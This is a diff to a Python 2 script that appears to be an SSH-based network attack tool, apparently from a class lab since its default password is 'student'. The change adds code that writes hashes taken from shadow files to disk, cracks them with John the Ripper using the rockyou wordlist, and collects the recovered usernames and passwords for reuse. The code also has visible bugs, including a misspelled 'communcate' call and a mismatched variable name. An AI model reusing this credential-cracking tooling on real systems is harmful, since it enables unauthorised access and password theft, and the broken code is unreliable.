@@ -16,12 +16,15 @@ g_verbose = True
 WORDLIST = "/usr/share/wordlists/rockyou.txt"
 DEFAULT_PASS = "student"
 ROOT = "root"
+
 q = Queue.Queue()
 ip_list = []
+
 FORWARD_PORT = 9050
 initial_comps = 0
-users = ["root"]
-passwords = ["student"]
+
+USERNAMES = ["root"]
+PASSWORDS = []
 
 class Computer:
     def __init__(self, ip, ssh_port):
@@ -164,16 +167,33 @@ def user_hashes(shadow_file):
 
     return accts
     
+
+# cracks a list of hashes with John the Ripper and stores any new usernames and
+# passwords in the global list of users/passwords
 def crack_with_john(hashes_lst):
+    global USERNAMES, PASSWORDS
     f = open("curr_hashes.txt", "w")
     f.write(hashes_list)
     f.close()
 
     os.system("john --format=sha512crypt --wordlist %s curr_hashes.txt" % (WORDLIST))
-    # get the user/pass output from john
-    hashes = subprocess.Popen("john --show curr_hashes.txt", shell=True, stdout=subprocess.PIPE).communcate()[0]
-    split it into array
+    # get only the user/pass output from john
+    hashes = subprocess.Popen("john --show curr_hashes.txt | grep ':'", shell=True, stdout=subprocess.PIPE).communcate()[0]
+
+    # split it into array
     hashes = hashes.split('\n')
+    # for each hash it finds
+    for h in hashes:
+        tokens = h.split(":")
+        user = tokens[0]
+        passwd = tokens[1]
+        # add the username to the summary list
+        if not (user in USERNAMES):
+            USERNAMES.append(user)
+        # add the password to the summary list
+        if not (passwd in PASSWORDS):
+            PASSWORDS.append(passwd)
+
     
 
 if __name__ == "__main__":
@@ -196,6 +216,9 @@ if __name__ == "__main__":
     print accts
     # output user hashes to a file so john can crack it
     crack_with_john(accts)
+
+    print USERNAMES
+    print PASSWORDS
 
     sys.exit(1)
 
